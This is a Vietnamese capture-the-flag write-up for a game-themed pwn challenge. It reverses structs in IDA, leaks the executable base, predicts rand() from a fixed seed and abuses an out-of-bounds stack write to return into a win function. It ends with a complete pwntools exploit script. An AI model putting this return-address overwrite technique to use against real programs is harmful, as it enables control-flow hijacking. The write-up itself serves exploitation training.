# tái định nghĩa cấu trúc sử dụng IDA + ret2win

Kiểm tra các chế độ bảo vệ cơ bản của chương trình :

![image](https://user-images.githubusercontent.com/93699926/235029207-61b42631-95d3-487e-88b3-8390969e6474.png)

Mở IDA lên và kiểm tra luồng thực thi của chương trình ta có một main rất dài và nhiều sub_function khác , sau khi kiểm tra tất cả các hàm thì ta phát hiện có một hàm vô cùng thú vị đó là 

![image](https://user-images.githubusercontent.com/93699926/235029474-20b42f29-c88e-4c0f-bebb-1b3eff5bc725.png)

sub_1D6D() hay đơn giản là hàm win() sẽ đọc flag và in nó ra cho ta 

trong hàm main có rất nhiều struct cần tái cấu trúc lại 3 struct đó sẽ như sau, taị lúc viết bài mình lỡ xóa mất file ida nên mình sẽ viết lại bằng code C như sau:

![image](https://user-images.githubusercontent.com/93699926/235030552-c35ad9f6-e28c-42ac-8dd1-0bdb40b70d89.png)

![image](https://user-images.githubusercontent.com/93699926/235030602-07f188d8-c135-472c-b2c8-710e52e28943.png)

ta có thể thấy là Monster.ptr -> địa chỉ của biến a10 và khi ta tạo monsters thì nó sẽ in ra địa chỉ đó cho chúng ta => và ta sẽ có được exe leak =>> đơn giản sau đó sẽ tính được exebase 

Sau khi khởi tạo xong TROOPER ,MONSTER,HERO thì chúng ta sẽ đến với sub_1799:

![image](https://user-images.githubusercontent.com/93699926/235031050-1e9c5d1a-b615-4544-8329-4f39481c3c5d.png)

hàm này như sau:

![image](https://user-images.githubusercontent.com/93699926/235031222-67a1c2a7-6017-4508-8ca7-d32188333981.png)

![image](https://user-images.githubusercontent.com/93699926/235031278-c645cf38-b76d-4930-8580-dabaa1e18c12.png)

![image](https://user-images.githubusercontent.com/93699926/235031312-80d8149f-7902-4541-9200-98bfbe6cc870.png)

Ok ở hàm naỳ thì chúng ta sẽ có 2 lựa chọn đó là attack monsters hay attack strooper:

Nếu ta attack strooper thì hero[0].index+=4 mỗi lần ta tấn công 

Còn nếu ta tấn công Monster thì chương trình sẽ bắt ta nhập một số random nếu đoán đúng thì monster.health sẽ bị -=damn +special damn của hero
 và nếu như ta tiêu diệt hết quái vật thì hero[0].index-=2
 
 ![image](https://user-images.githubusercontent.com/93699926/235032121-1a845704-aa75-428c-9040-65371f9fba6a.png)

và ở đây ta sẽ có lỗi out of bound khi mà con trỏ v17 sẽ chỉ đến địa chỉ của s[hero[0].index],sau đó nó sẽ khi các giá trị 8 byte của hero.name vô s[0]
và rồi 8 byte sau vô s[1].
Đối chiếu lên thì ta có như sau :

![image](https://user-images.githubusercontent.com/93699926/235032460-9e1c611a-6d9e-40c7-9eb2-d53fbb52b267.png)
 
ta thấy thì s được lưu trên stack ở vị trí [rbp-0x120] mà s được khai báo là _OWORD 16 bytes .
Nên ta có thể tính được như sau 0x120/0x10 =18 (0x12) vậy nếu ta có thể thay đổi hero.index thành 0x12 thì ta sẽ có thể ghi lên địa chỉ rbp và ngay sau rbp sẽ là saved rip của main

Và để thay đổi hero.index thì không khó ta chỉ cần tấn công strooper 5 lần => index=20
đánh tháng monster index-=2(=18). và để đánh thắng quái thì ta cần đoán đúng số random . ở đây vì khi chương trình chạy srand đã gieo seed =0x1337 > Vậy để đoán đúng tì ta chỉ cần gieo đúng seed đó và gọi random()

để có thể dùng được các hàm trong thư viện code C thì ta chỉ cần làm như sau 

```python

from ctypes import*
libc = ELF('./libc-2.27.so', checksec=False)
glibc = cdll.LoadLibrary(libc.path)
glibc.srand(0x1337)
val=glibc.rand()%2022 # chương trình nó sẽ lấy số random rồi chia lấy dư cho 2022 nữa
```

và lưu ý khi ta chạy chương trình và thay đổi địa chỉ trả về thành hàm win thì thay vì nhảy vô <win+0> thì hãy nhảy vô <win +5> pass qua đoạc push rbp đê tránh gặp lỗi segfault khi mà giá trị stack có đuôi 0xffffx8
, ta muốn nó có đuôi =0xffffx0

ok , vậy ta sẽ có script như sau :
full script in r.py
```python
from pwn import *
from ctypes import*
libc = ELF('./libc-2.27.so', checksec=False)
glibc = cdll.LoadLibrary(libc.path)
context.binary=exe=ELF('./gameofkma_patched',checksec=False)
glibc.srand(0x1337)
p=process(exe.path)
def GDB():
    gdb.attach(p,gdbscript='''
        c
        ''')
    input()
GDB()

p.sendlineafter(b"How many trooper(s) do you want?(0-5)\n",b"5")
p.sendlineafter(b"How many monster do you want?(0-2)\n",b"2")
leak_list=p.recvuntil(b"How many hero",drop=True).split(b"\n")
#print(leak_list)
leak1=int.from_bytes(leak_list[0],"little")
exe.address=leak1-0x1e8a
leak2=int(leak_list[1].split(b' ')[1],16)
log.info('[+]leak1:'+hex(leak1))
log.info('[+]leak2:'+hex(leak2))
log.info('[+]exe base:'+hex(exe.address))
main=exe.address+0x1E8A
log.info('[+]main:'+hex(main))
b1=exe.address+0x2412 #b1  là break ở vị trí leave ret của main
log.info('[+]b1:'+hex(b1))
p.sendlineafter(b"do you want?(0-2)\n",b"1")
pop_rdi=exe.address+0x0000000000002483
ret=exe.address+0x000000000000101a
win=exe.address+0x1D6D
input("enter")
payload=p64(ret)+p64(win+5)
p.sendafter(b'hero?\n', payload)
for i in range(5):
	p.sendlineafter(b"Do you wanna attack [1]monster or [0]trooper?(1/0)",b"0")

glibc.srand(0x1337)
for i in range(8):
	p.sendlineafter(b"Do you wanna attack [1]monster or [0]trooper?(1/0)",b"1")
	val=glibc.rand()%2022
	p.sendlineafter(b"think? > ",f"{val}".encode())

p.interactive()
```




